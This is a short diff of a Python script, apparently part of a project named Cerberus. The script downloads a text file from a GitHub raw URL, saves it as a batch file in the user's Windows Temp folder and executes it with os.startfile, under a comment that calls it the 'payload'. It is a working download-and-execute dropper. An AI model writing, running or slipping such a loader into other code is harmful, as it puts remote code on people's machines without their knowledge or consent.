@@ -2,16 +2,15 @@ import os.path
 import urllib.request
 from bs4 import BeautifulSoup
 
-x = os.getlogin()
-
 filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/THost.bat")
 
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource3.txt") as response:
     data = response.read().decode("utf-8")
     with open(filename, "a+") as fp: fp.write(str(data))
 
-#urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource3.txt", filename)
 
+# Change directory to Temp folder
 os.chdir("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp")
+
+# Runs payload
 os.startfile("THost.bat")
-# exec(open(filename).read())
